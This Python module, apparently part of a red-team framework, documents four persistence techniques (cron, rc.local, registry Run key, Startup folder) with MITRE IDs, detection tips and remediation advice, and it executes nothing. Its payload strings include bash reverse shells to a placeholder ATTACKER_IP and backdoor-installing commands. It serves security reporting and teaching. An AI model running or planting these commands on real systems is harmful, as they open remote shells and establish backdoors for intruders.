"""
modules/persistence.py — Persistence-simulation phase for the AI Red Team Framework.

IMPORTANT: This module DOCUMENTS and SIMULATES persistence techniques only.
No actual persistence is established on any system.  All output is strictly
for reporting and academic purposes.

MITRE ATT&CK:
  T1053.003  Scheduled Task/Job: Cron
  T1037.004  Boot or Logon Initialization Scripts: RC Scripts
  T1547.001  Boot or Logon Autostart Execution: Registry Run Keys
"""

import json
import sys
from datetime import datetime
from typing import Any

from rich.console import Console
from rich.panel import Panel
from rich.table import Table as RichTable

from core.state_manager import state

console = Console()


# ---------------------------------------------------------------------------
# 1. Simulate Linux Cron Persistence
# ---------------------------------------------------------------------------

def simulate_linux_cron(target: str) -> dict[str, Any]:
    """Return a *simulated* cron-based persistence payload description."""
    return {
        "technique": "Cron Job Persistence",
        "mitre_id": "T1053.003",
        "simulated": True,
        "payload_string": (
            "* * * * * root /bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"
        ),
        "target_file": "/etc/crontab",
        "detection": "Monitor /etc/crontab for unauthorized modifications",
        "remediation": "Audit cron jobs weekly. Use cron.allow/deny restrictions.",
        "timestamp": datetime.utcnow().isoformat(),
    }


# ---------------------------------------------------------------------------
# 2. Simulate Linux rc.local Persistence
# ---------------------------------------------------------------------------

def simulate_linux_rc_local(target: str) -> dict[str, Any]:
    """Return a *simulated* rc.local startup-script persistence description."""
    return {
        "technique": "RC.local Startup Script",
        "mitre_id": "T1037.004",
        "simulated": True,
        "payload_string": (
            "#!/bin/bash\n"
            "/bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 &\n"
            "exit 0"
        ),
        "target_file": "/etc/rc.local",
        "detection": "Monitor /etc/rc.local for unauthorized changes; check file integrity with AIDE/Tripwire.",
        "remediation": "Disable rc.local execution or restrict write access. Use systemd service hardening.",
        "timestamp": datetime.utcnow().isoformat(),
    }


# ---------------------------------------------------------------------------
# 3. Simulate Windows Registry Run Key Persistence
# ---------------------------------------------------------------------------

def simulate_windows_registry(target: str) -> dict[str, Any]:
    """Return a *simulated* Windows registry Run-key persistence description."""
    return {
        "technique": "Registry Run Key",
        "mitre_id": "T1547.001",
        "simulated": True,
        "payload_string": (
            'reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run '
            '/v Backdoor /t REG_SZ /d "cmd.exe"'
        ),
        "target_file": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        "detection": "Monitor registry Run/RunOnce keys for new or modified values using Sysmon (Event ID 13).",
        "remediation": "Restrict registry write access. Deploy endpoint detection (EDR) with Run-key monitoring.",
        "timestamp": datetime.utcnow().isoformat(),
    }


# ---------------------------------------------------------------------------
# 4. Simulate Windows Startup Folder Persistence
# ---------------------------------------------------------------------------

def simulate_windows_startup(target: str) -> dict[str, Any]:
    """Return a *simulated* Windows Startup-folder persistence description."""
    return {
        "technique": "Startup Folder",
        "mitre_id": "T1547.001",
        "simulated": True,
        "payload_string": (
            'copy backdoor.exe '
            '"C:\\Users\\<USER>\\AppData\\Roaming\\Microsoft\\Windows\\'
            'Start Menu\\Programs\\Startup\\backdoor.exe"'
        ),
        "target_file": (
            "C:\\Users\\<USER>\\AppData\\Roaming\\Microsoft\\Windows\\"
            "Start Menu\\Programs\\Startup\\"
        ),
        "detection": "Monitor Startup folder contents for new executables; use Autoruns for auditing.",
        "remediation": "Restrict write access to Startup folders. Use AppLocker / WDAC to block unsigned executables.",
        "timestamp": datetime.utcnow().isoformat(),
    }


# ---------------------------------------------------------------------------
# 5. Run Persistence Simulation Phase
# ---------------------------------------------------------------------------

def run_persistence() -> list[dict[str, Any]]:
    """Execute all persistence simulations and persist findings.

    No real persistence is established — every entry has ``simulated: True``.
    """
    console.rule("[bold cyan]Phase 6 — Persistence Simulation[/bold cyan]")

    target: str = state.get("target", "unknown")

    simulations: list[dict[str, Any]] = [
        simulate_linux_cron(target),
        simulate_linux_rc_local(target),
        simulate_windows_registry(target),
        simulate_windows_startup(target),
    ]

    # ---- Warning banner ----
    console.print(
        Panel(
            "[bold bright_yellow]⚠  SIMULATED ONLY — No actual persistence installed ⚠[/bold bright_yellow]\n"
            "[yellow]The following persistence techniques have been documented\n"
            "for reporting purposes.  No payloads were deployed.[/yellow]",
            title="[bold white]Persistence Simulation[/bold white]",
            border_style="bright_yellow",
        )
    )

    # ---- Summary table ----
    table = RichTable(title="Persistence Techniques", show_lines=True)
    table.add_column("Technique", style="cyan")
    table.add_column("MITRE ID", style="magenta")
    table.add_column("Simulated", justify="center")
    table.add_column("Detection Method", style="dim")

    for sim in simulations:
        table.add_row(
            sim.get("technique", ""),
            sim.get("mitre_id", ""),
            "[green]YES[/green]" if sim.get("simulated") else "[red]NO[/red]",
            sim.get("detection", ""),
        )

    console.print(table)

    # ---- Persist ----
    state.set("persistence_simulated", simulations)
    console.print("[green]✔  Persistence simulations saved to state.[/green]")
    return simulations


# ---------------------------------------------------------------------------
# Convenience alias used by core/engine.py
# ---------------------------------------------------------------------------

def run(target: str, **kwargs: Any) -> list[dict[str, Any]]:
    """Entry-point called by the pipeline orchestrator."""
    return run_persistence()


# ---------------------------------------------------------------------------
# Stand-alone execution
# ---------------------------------------------------------------------------

if __name__ == "__main__":
    run_persistence()
